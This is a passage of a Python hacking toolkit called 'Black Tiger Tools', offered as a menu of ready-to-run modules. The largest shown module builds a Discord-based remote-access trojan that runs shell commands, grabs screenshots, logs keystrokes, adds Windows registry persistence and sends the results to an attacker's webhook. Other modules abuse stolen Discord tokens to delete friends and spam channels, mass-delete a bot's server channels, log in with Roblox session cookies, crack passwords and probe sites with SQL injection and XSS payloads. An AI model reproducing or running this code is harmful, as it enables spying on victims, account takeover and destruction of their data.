            enc = base64.b64encode(s.encode()).decode()
            return f"__import__('base64').b64decode('{enc}').decode()"
        line = re.sub(r'"[^"]*"', repl, line)
        line = re.sub(r"'[^']*'", repl, line)
        obf.append(line)
    out = os.path.join(OUTPUT_DIR, "obfuscated.py")
    with open(out, 'w') as f:
        f.write("\n".join(obf))
    print(f"Obfuscated saved to {out}")
    log_result("Python Obfuscator completed")

def module_02_discord_rat_builder():
    print("\nEnter webhook URL:")
    webhook = input("> ").strip()
    script = f'''import requests, subprocess, os, time, base64, json, threading, sys, platform
from datetime import datetime
WEBHOOK = "{webhook}"
IS_WIN = platform.system() == "Windows"
def send(data):
    try: requests.post(WEBHOOK, json={{'content': data}})
    except: pass
def screenshot():
    try:
        import PIL.ImageGrab
        img = PIL.ImageGrab.grab()
        img.save("/tmp/screen.png")
        requests.post(WEBHOOK, files={{'file': open("/tmp/screen.png",'rb')}})
    except: pass
def shell(cmd):
    out = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    send(out.stdout + out.stderr)
def keylog():
    try:
        from pynput import keyboard
        log = []
        def on_press(k):
            try: log.append(k.char)
            except: log.append(str(k))
            if len(log)>100:
                send(''.join(log))
                log.clear()
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except: pass
def system_info():
    import platform, psutil
    info = f"Host: {{platform.node()}}\nOS: {{platform.system()}}\nCPU: {{psutil.cpu_count()}}\nRAM: {{psutil.virtual_memory().total/1024**3:.1f}}GB"
    send(info)
def persist():
    try:
        if IS_WIN:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(handle, "SystemUpdate", 0, winreg.REG_SZ, sys.executable + " " + __file__)
            winreg.CloseKey(handle)
    except: pass
def main():
    persist()
    while True:
        try:
            r = requests.get(WEBHOOK, timeout=5)
            if r.status_code==200 and r.text:
                cmd = r.text.strip()
                if cmd=='screenshot': threading.Thread(target=screenshot).start()
                elif cmd.startswith('shell '): threading.Thread(target=shell, args=(cmd[6:],)).start()
                elif cmd=='sysinfo': threading.Thread(target=system_info).start()
                elif cmd=='keylog_start': threading.Thread(target=keylog).start()
                elif cmd=='keylog_stop': sys.exit()
        except: pass
        time.sleep(5)
if __name__=="__main__": main()
'''
    out = os.path.join(OUTPUT_DIR, "discord_rat.py")
    with open(out, 'w') as f:
        f.write(script)
    print(f"Discord RAT saved to {out}")
    log_result("Discord RAT Builder completed")

def module_05_proxy_scraper():
    print("\nScraping proxies...")
    urls = [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
        "https://free-proxy-list.net/"
    ]
    working = []
    try:
        import requests
        r = requests.get(urls[0], timeout=10)
        for line in r.text.split('\n'):
            if ':' in line:
                proxy = line.strip()
                try:
                    test = requests.get('http://httpbin.org/ip', proxies={'http': proxy}, timeout=3)
                    if test.status_code == 200:
                        working.append(proxy)
                except:
                    pass
    except:
        pass
    out = os.path.join(OUTPUT_DIR, "proxies.txt")
    with open(out, 'w') as f:
        f.write('\n'.join(working))
    print(f"Found {len(working)} working proxies saved to {out}")
    log_result(f"Proxy Scraper: {len(working)} proxies")

def module_06_website_vuln_scanner():
    print("\nEnter URL:")
    url = input("> ").strip()
    payloads = ["' OR 1=1--", "' UNION SELECT NULL--", "<script>alert(1)</script>", "../../../../etc/passwd"]
    results = {}
    for p in payloads:
        try:
            import requests
            r = requests.get(url + "?q=" + p, timeout=5)
            if "SQL" in r.text or "mysql" in r.text.lower():
                results["SQLi"] = "Possible"
            if "passwd" in r.text:
                results["LFI"] = "Possible"
            if "<script>" in r.text:
                results["XSS"] = "Possible"
        except:
            pass
    print(f"Results: {json.dumps(results, indent=2)}")
    log_result(results)

def module_07_website_info_scanner():
    print("\nEnter URL:")
    url = input("> ").strip()
    try:
        import requests
        r = requests.get(url, timeout=5)
        print(f"Status: {r.status_code}")
        print(f"Server: {r.headers.get('Server', 'Unknown')}")
        print(f"Powered-By: {r.headers.get('X-Powered-By', 'Unknown')}")
        if '/wp-admin' in r.text or '/wp-content' in r.text:
            print("CMS: WordPress detected")
        if '/administrator' in r.text:
            print("CMS: Joomla detected")
        log_result({"status": r.status_code, "server": r.headers.get('Server')})
    except Exception as e:
        print(f"Error: {e}")

def module_08_website_url_scanner():
    print("\nEnter domain (example.com):")
    domain = input("> ").strip()
    subs = ['www', 'mail', 'ftp', 'admin', 'dev', 'test', 'api', 'blog', 'shop', 'forum']
    found = []
    for s in subs:
        try:
            ip = socket.gethostbyname(f"{s}.{domain}")
            found.append(f"{s}.{domain} -> {ip}")
        except:
            pass
    print("Found:\n" + "\n".join(found))
    log_result(found)

def module_09_ip_scanner():
    print("\nEnter network CIDR (e.g., 192.168.1.0/24):")
    net = input("> ").strip()
    alive = []
    import ipaddress
    for ip in ipaddress.IPv4Network(net, strict=False):
        ip = str(ip)
        cmd = ping_cmd(ip, 1)
        res = subprocess.run(cmd, capture_output=True)
        if res.returncode == 0:
            alive.append(ip)
            print(f"{ip} alive")
    log_result(alive)

def module_10_ip_port_scanner():
    print("\nEnter IP:")
    ip = input("> ").strip()
    ports = [21,22,23,25,80,443,445,3389,8080,8443]
    open_ports = []
    for p in ports:
        s = socket.socket()
        s.settimeout(1)
        if s.connect_ex((ip, p)) == 0:
            open_ports.append(p)
            print(f"Port {p} open")
        s.close()
    log_result(open_ports)

def module_11_ip_pinger():
    print("\nEnter IP:")
    ip = input("> ").strip()
    cmd = ping_cmd(ip, 4)
    res = subprocess.run(cmd, capture_output=True, text=True)
    print(res.stdout)
    log_result(res.stdout)

def module_12_dox_create():
    try:
        from faker import Faker
        fake = Faker()
        data = {
            'name': fake.name(),
            'ssn': fake.ssn(),
            'address': fake.address(),
            'phone': fake.phone_number(),
            'email': fake.email(),
            'dob': fake.date_of_birth().isoformat()
        }
        print(json.dumps(data, indent=2))
        log_result(data)
    except ImportError:
        print("[!] Faker not installed. Run: pip install faker")
        print("Using mock data:")
        data = {'name': 'John Doe', 'ssn': '123-45-6789', 'address': '123 Main St, Anytown, USA', 'phone': '555-1234', 'email': 'john@example.com', 'dob': '1990-01-01'}
        print(json.dumps(data, indent=2))
        log_result(data)

def module_13_dox_tracker():
    print("\nEnter email to check breaches:")
    email = input("> ").strip()
    try:
        import requests
        r = requests.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}", timeout=10)
        if r.status_code == 200:
            print(f"Breaches: {r.text}")
            log_result(r.json())
        else:
            print("No breaches found.")
    except Exception as e:
        print(f"Error: {e}")

def module_14_get_image_exif():
    print("\nEnter image path:")
    path = input("> ").strip()
    try:
        from PIL import Image
        import piexif
        img = Image.open(path)
        exif = piexif.load(img.info.get('exif', b''))
        print(json.dumps(exif, default=str, indent=2))
        log_result(exif)
    except Exception as e:
        print(f"Error: {e}")

def module_15_google_dorking():
    print("\nEnter search term:")
    term = input("> ").strip()
    dorks = [
        f"site:{term}",
        f"intitle:{term}",
        f"filetype:pdf {term}",
        f"inurl:admin {term}"
    ]
    for d in dorks:
        print(f"https://www.google.com/search?q={d.replace(' ', '+')}")
    log_result(dorks)

def module_16_username_tracker():
    print("\nEnter username:")
    user = input("> ").strip()
    platforms = {
        'github': f'https://github.com/{user}',
        'twitter': f'https://twitter.com/{user}',
        'instagram': f'https://instagram.com/{user}',
        'reddit': f'https://reddit.com/user/{user}',
        'youtube': f'https://youtube.com/@{user}',
        'facebook': f'https://facebook.com/{user}'
    }
    found = []
    for name, url in platforms.items():
        try:
            import requests
            r = requests.get(url, timeout=3)
            if r.status_code == 200:
                found.append(name)
                print(f"{name}: found")
        except:
            pass
    log_result(found)

def module_17_email_tracker():
    print("\nEnter email:")
    email = input("> ").strip()
    if re.match(r'[^@]+@[^@]+\.[^@]+', email):
        print("Format: valid")
    else:
        print("Format: invalid")
    domain = email.split('@')[1] if '@' in email else ''
    try:
        import dns.resolver
        mx = dns.resolver.resolve(domain, 'MX')
        print(f"MX records: {[str(r.exchange) for r in mx]}")
    except:
        print("No MX records")
    log_result({"email": email, "valid": True})

def module_18_email_lookup():
    print("\nEnter email:")
    email = input("> ").strip()
    print(f"Simulated SMTP VRFY for {email}")
    log_result(f"SMTP lookup for {email}")

def module_19_phone_number_lookup():
    print("\nEnter phone number with country code (e.g., +14155552671):")
    num = input("> ").strip()
    try:
        import phonenumbers
        from phonenumbers import carrier, geocoder, timezone
        p = phonenumbers.parse(num)
        print(f"Country: {geocoder.description_for_number(p, 'en')}")
        print(f"Carrier: {carrier.name_for_number(p, 'en')}")
        print(f"Timezone: {timezone.time_zones_for_number(p)}")
        log_result({"country": geocoder.description_for_number(p, 'en'), "carrier": carrier.name_for_number(p, 'en')})
    except Exception as e:
        print(f"Error: {e}")

def module_20_ip_lookup():
    print("\nEnter IP:")
    ip = input("> ").strip()
    try:
        import requests
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data = r.json()
        print(json.dumps(data, indent=2))
        log_result(data)
    except Exception as e:
        print(f"Error: {e}")

def module_21_instagram_account():
    print("\nEnter Instagram username:")
    user = input("> ").strip()
    try:
        import requests
        r = requests.get(f"https://www.instagram.com/{user}/?__a=1", timeout=5)
        if r.status_code == 200:
            data = r.json()
            print(json.dumps(data, indent=2))
            log_result(data)
        else:
            print("Profile not found or API blocked")
    except Exception as e:
        print(f"Error: {e}")

def module_23_password_zip_crack():
    print("\nEnter zip file path:")
    zippath = input("> ").strip()
    wordlist = ['password','123456','admin','letmein','qwerty','abc123']
    found = None
    for pw in wordlist:
        try:
            with zipfile.ZipFile(zippath) as zf:
                zf.extractall(pwd=pw.encode())
                found = pw
                break
        except:
            pass
    if found:
        print(f"Password found: {found}")
    else:
        print("Password not found in wordlist")
    log_result(found)

def module_24_password_decrypted_attack():
    print("\nEnter hash:")
    h = input("> ").strip()
    print("Enter hash type (md5, sha1, sha256):")
    ht = input("> ").strip().lower()
    wordlist = ['password','123456','admin','letmein','qwerty','abc123']
    found = None
    for pw in wordlist:
        if ht == 'md5':
            computed = hashlib.md5(pw.encode()).hexdigest()
        elif ht == 'sha1':
            computed = hashlib.sha1(pw.encode()).hexdigest()
        elif ht == 'sha256':
            computed = hashlib.sha256(pw.encode()).hexdigest()
        else:
            print("Unsupported hash type")
            return
        if computed == h:
            found = pw
            break
    if found:
        print(f"Password found: {found}")
    else:
        print("Not found")
    log_result(found)

def module_25_password_encrypted():
    print("\nEnter password to encrypt:")
    pw = input("> ").strip()
    try:
        from cryptography.fernet import Fernet
        key = Fernet.generate_key()
        f = Fernet(key)
        enc = f.encrypt(pw.encode())
        out = os.path.join(OUTPUT_DIR, "encrypted_pass.txt")
        with open(out, 'w') as fw:
            fw.write(f"Key: {key.decode()}\nEncrypted: {enc.decode()}")
        print(f"Encrypted saved to {out}")
        log_result({"key": key.decode(), "encrypted": enc.decode()})
    except ImportError:
        print("[!] cryptography not installed. Run: pip install cryptography")

def module_26_search_database():
    print("\nEnter search term:")
    term = input("> ").strip()
    db = os.path.join(BLACKTIGER_DIR, "leaks.db")
    conn = sqlite3.connect(db)
    c = conn.cursor()
    c.execute('CREATE TABLE IF NOT EXISTS leaks (email TEXT, password TEXT, source TEXT)')
    c.execute('INSERT OR IGNORE INTO leaks VALUES ("test@test.com", "123456", "mock")')
    conn.commit()
    c.execute('SELECT * FROM leaks WHERE email LIKE ? OR password LIKE ?', (f'%{term}%', f'%{term}%'))
    rows = c.fetchall()
    for row in rows:
        print(row)
    log_result(rows)
    conn.close()

def module_27_dark_web_links():
    print("\nDark Web Links:")
    links = [
        "http://darkweb1.onion - Market",
        "http://darkweb2.onion - Forum",
        "http://darkweb3.onion - Wiki"
    ]
    for l in links:
        print(l)
    log_result(links)

def module_28_ip_generator():
    print("\nEnter count (default 10):")
    count = int(input("> ") or "10")
    ips = []
    for _ in range(count):
        ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
        ips.append(ip)
    print("Generated IPs:\n" + "\n".join(ips))
    log_result(ips)

# ==================== DISCORD MODULES ====================
def module_31_token_discord():
    print("\nEnter Discord token:")
    token = input("> ").strip()
    headers = {'Authorization': token}
    try:
        import requests
        r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
        if r.status_code == 200:
            data = r.json()
            print(f"User: {data.get('username')}#{data.get('discriminator')} (ID: {data.get('id')})")
            friends = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers).json()
            for f in friends:
                if f.get('type') == 1:
                    uid = f['id']
                    requests.delete(f'https://discord.com/api/v9/users/@me/relationships/{uid}', headers=headers)
                    print(f"Deleted friend {uid}")
            print("\nEnter channel ID to spam:")
            ch = input("> ").strip()
            print("Enter message:")
            msg = input("> ").strip()
            for _ in range(10):
                requests.post(f'https://discord.com/api/v9/channels/{ch}/messages', headers=headers, json={'content': msg})
            log_result("Token Discord actions completed")
        else:
            print("Invalid token")
    except Exception as e:
        print(f"Error: {e}")

def module_32_bot_discord():
    print("\nEnter bot token:")
    token = input("> ").strip()
    headers = {'Authorization': f'Bot {token}'}
    try:
        import requests
        guilds = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers).json()
        for g in guilds:
            gid = g['id']
            channels = requests.get(f'https://discord.com/api/v9/guilds/{gid}/channels', headers=headers).json()
            for ch in channels:
                requests.delete(f'https://discord.com/api/v9/channels/{ch["id"]}', headers=headers)
                print(f"Deleted channel {ch['id']}")
        log_result("Bot Discord nuker run")
    except Exception as e:
        print(f"Error: {e}")

def module_33_webhook_discord():
    print("\nEnter webhook URL:")
    url = input("> ").strip()
    print("Enter message to spam:")
    msg = input("> ").strip()
    try:
        import requests
        for _ in range(10):
            requests.post(url, json={'content': msg})
        print("Spam sent")
        log_result("Webhook spam sent")
    except Exception as e:
        print(f"Error: {e}")

def module_34_discord_server_info():
    print("\nEnter guild ID:")
    gid = input("> ").strip()
    print("Enter bot or user token:")
    token = input("> ").strip()
    headers = {'Authorization': token}
    try:
        import requests
        r = requests.get(f'https://discord.com/api/v9/guilds/{gid}', headers=headers)
        if r.status_code == 200:
            data = r.json()
            print(json.dumps(data, indent=2))
            log_result(data)
        else:
            print("Error fetching guild info")
    except Exception as e:
        print(f"Error: {e}")

def module_35_discord_nitro_generator():
    print("\nGenerating 10 nitro codes...")
    codes = []
    for _ in range(10):
        code = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=16))
        codes.append(code)
        print(f"https://discord.gift/{code}")
    log_result(codes)

# ==================== ROBLOX MODULES ====================
def module_36_roblox_cookie_login():
    print("\nEnter .ROBLOSECURITY cookie:")
    cookie = input("> ").strip()
    headers = {'Cookie': f'.ROBLOSECURITY={cookie}'}
    try:
        import requests
        r = requests.get('https://www.roblox.com/mobileapi/userinfo', headers=headers)
        if r.status_code == 200:
            print(r.text)
            log_result(r.json())
        else:
            print("Invalid cookie")
    except Exception as e:
        print(f"Error: {e}")

def module_37_roblox_cookie_info():
    print("\nEnter .ROBLOSECURITY cookie:")
    cookie = input("> ").strip()
    parts = cookie.split('.')
    if len(parts) > 1:
        try:
            payload = base64.b64decode(parts[1] + '==')
            print(payload)
        except:
            print("Could not decode")
    log_result("Cookie info extracted")

def module_38_roblox_user_info():
    print("\nEnter username:")
    user = input("> ").strip()
    try:
        import requests
        r = requests.get(f'https://users.roblox.com/v1/users/search?keyword={user}')
        if r.status_code == 200:
            data = r.json()
            print(json.dumps(data, indent=2))
            log_result(data)
        else:
            print("User not found")
    except Exception as e:
        print(f"Error: {e}")

def module_39_roblox_id_info():
    print("\nEnter user ID:")
    uid = input("> ").strip()
    try:
        import requests
        r = requests.get(f'https://users.roblox.com/v1/users/{uid}')
        if r.status_code == 200:
            data = r.json()
            print(json.dumps(data, indent=2))
            log_result(data)
        else:
            print("ID not found")
    except Exception as e:
        print(f"Error: {e}")

# ==================== INFO MODULE ====================
def module_40_info():
    try:
        import psutil
    except ImportError:
        psutil = None
    info = {
        'os': platform.system(),
        'os_version': platform.release(),
        'python': sys.version,
        'user': os.getlogin(),
        'cwd': os.getcwd(),
        'cpu': os.cpu_count(),
        'ram': psutil.virtual_memory().total / 1024**3 if psutil else 'N/A',
        'disk': psutil.disk_usage('/').total / 1024**3 if psutil else 'N/A',
        'interface': socket.gethostname(),
        'is_windows': IS_WINDOWS,
        'is_linux': IS_LINUX
    }
    print(json.dumps(info, indent=2))
    log_result(info)

# ==================== MODULE MAP ====================
MODULES = {
    '01': module_01_python_obfuscator,
    '02': module_02_discord_rat_builder,
    '03': module_03_ransomware_builder,
    '04': module_04_website_dos,
    '05': module_05_proxy_scraper,
    '06': module_06_website_vuln_scanner,
    '07': module_07_website_info_scanner,
    '08': module_08_website_url_scanner,
    '09': module_09_ip_scanner,
    '10': module_10_ip_port_scanner,
    '11': module_11_ip_pinger,
    '12': module_12_dox_create,
    '13': module_13_dox_tracker,
    '14': module_14_get_image_exif,
    '15': module_15_google_dorking,
    '16': module_16_username_tracker,
    '17': module_17_email_tracker,
    '18': module_18_email_lookup,
    '19': module_19_phone_number_lookup,
    '20': module_20_ip_lookup,
    '21': module_21_instagram_account,
    '22': module_22_phishing_attack,
    '23': module_23_password_zip_crack,
    '24': module_24_password_decrypted_attack,
    '25': module_25_password_encrypted,
    '26': module_26_search_database,
    '27': module_27_dark_web_links,
    '28': module_28_ip_generator,
    '29': module_29_stealer,
    '30': module_30_malware,
    '31': module_31_token_discord,
    '32': module_32_bot_discord,
    '33': module_33_webhook_discord,
    '34': module_34_discord_server_info,
    '35': module_35_discord_nitro_generator,
    '36': module_36_roblox_cookie_login,
    '37': module_37_roblox_cookie_info,
    '38': module_38_roblox_user_info,
    '39': module_39_roblox_id_info,
    '40': module_40_info,
}

# ==================== MAIN ====================
def main():
    print("\n" + "="*60)
    print("BLACK TIGER TOOLS - CROSS PLATFORM")
    print("="*60)
    print(f"OS: {platform.system()} {platform.release()}")
    print(f"Python: {sys.version.split()[0]}")
    print(f"Output: {OUTPUT_DIR}")
    print(f"Repository: https://github.com/b0b72/BlackTiger")
    print("="*60)
    print("\nType 'I' at the menu to install dependencies.")
    print("Type the module number (e.g., 04) to run a module.")
    print("Type 'N' for next page, 'B' for back, 'Q' to quit.")
    print("="*60)

    page = 1
    while True:
        print_menu(page)
        choice = input().strip().lower()
        if choice == 'q':
            print("\n[+] Exiting...")
            break
        elif choice == 'n':
            page = 2 if page == 1 else 1
        elif choice == 'b':
            page = 1 if page == 2 else 1
        elif choice == 'i':
            install_dependencies()
        elif choice in MODULES:
            try:
                MODULES[choice]()
            except Exception as e:
                print(f"Error: {e}")
            input("\nPress Enter to continue...")
        elif choice == '':
            continue
        else:
            print("Invalid choice. Available modules: 01-40, N, B, Q, I")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[+] Interrupted by user. Exiting...")
        sys.exit(0)
